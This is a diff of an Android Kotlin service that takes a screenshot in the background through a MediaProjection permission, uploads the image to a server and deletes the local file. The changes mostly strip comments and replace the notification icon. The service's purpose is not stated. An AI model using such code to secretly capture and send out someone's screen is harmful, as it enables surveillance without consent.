@@ -32,7 +32,6 @@ class ScreenCaptureBackgroundService : Service() {
         private const val NOTIFICATION_ID = 2002
         private const val CHANNEL_ID = "screen_capture_channel"
         
-        // ✅ MediaProjection permission storage
         var mediaProjectionResultCode: Int? = null
         var mediaProjectionData: Intent? = null
         var hasPermission = false
@@ -70,7 +69,6 @@ class ScreenCaptureBackgroundService : Service() {
         Log.d(TAG, "========================================")
         Log.d(TAG, "🖥️ BACKGROUND SCREENSHOT START")
 
-        // Start foreground
         startForeground(NOTIFICATION_ID, createNotification("Capturing screen..."))
 
         if (!hasPermission || mediaProjectionResultCode == null || mediaProjectionData == null) {
@@ -104,7 +102,6 @@ class ScreenCaptureBackgroundService : Service() {
             
             Log.d(TAG, "✅ MediaProjection created")
             
-            // Get screen metrics
             val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
             val metrics = DisplayMetrics()
             
@@ -122,7 +119,6 @@ class ScreenCaptureBackgroundService : Service() {
             
             Log.d(TAG, "Screen: ${width}x${height} @ ${density}dpi")
             
-            // Setup ImageReader
             imageReader = ImageReader.newInstance(
                 width, 
                 height, 
@@ -130,7 +126,6 @@ class ScreenCaptureBackgroundService : Service() {
                 2
             )
             
-            // Create VirtualDisplay
             virtualDisplay = mediaProjection!!.createVirtualDisplay(
                 "ScreenCapture",
                 width,
@@ -144,7 +139,6 @@ class ScreenCaptureBackgroundService : Service() {
             
             Log.d(TAG, "✅ VirtualDisplay created")
             
-            // Wait for image then capture
             handler.postDelayed({
                 captureImage()
             }, 500)
@@ -169,7 +163,6 @@ class ScreenCaptureBackgroundService : Service() {
             
             Log.d(TAG, "✅ Image acquired: ${image.width}x${image.height}")
             
-            // Convert to Bitmap
             val planes = image.planes
             val buffer = planes[0].buffer
             val pixelStride = planes[0].pixelStride
@@ -187,7 +180,6 @@ class ScreenCaptureBackgroundService : Service() {
             
             Log.d(TAG, "✅ Bitmap created")
             
-            // Save & send
             saveAndSend(bitmap)
             
         } catch (e: Exception) {
@@ -211,11 +203,10 @@ class ScreenCaptureBackgroundService : Service() {
             Log.d(TAG, "✅ Screenshot saved: ${file.path}")
             Log.d(TAG, "Size: ${file.length() / 1024} KB")
             
-            // ✅ FIX: Send to server with proper context
             Thread {
                 try {
                     val success = ApiClient.uploadScreenshot(
-                        applicationContext,  // ✅ Use applicationContext
+                        applicationContext,
                         file
                     )
                     
@@ -225,7 +216,6 @@ class ScreenCaptureBackgroundService : Service() {
                         Log.e(TAG, "❌ Failed to upload screenshot")
                     }
                     
-                    // Delete after upload
                     file.delete()
                     
                 } catch (e: Exception) {
@@ -271,11 +261,12 @@ class ScreenCaptureBackgroundService : Service() {
     }
 
     private fun createNotification(message: String): Notification {
+        // ✅ FIX: Use android built-in icon
         val builder = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Screen Capture")
             .setContentText(message)
-            .setSmallIcon(R.drawable.ic_notification)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setSmallIcon(android.R.drawable.ic_menu_gallery) // ✅ Use system icon
+            .setPriority(NotificationCompat.PRIORITY_LOW) // ✅ Use NotificationCompat constant
             .setAutoCancel(true)
 
         return builder.build()
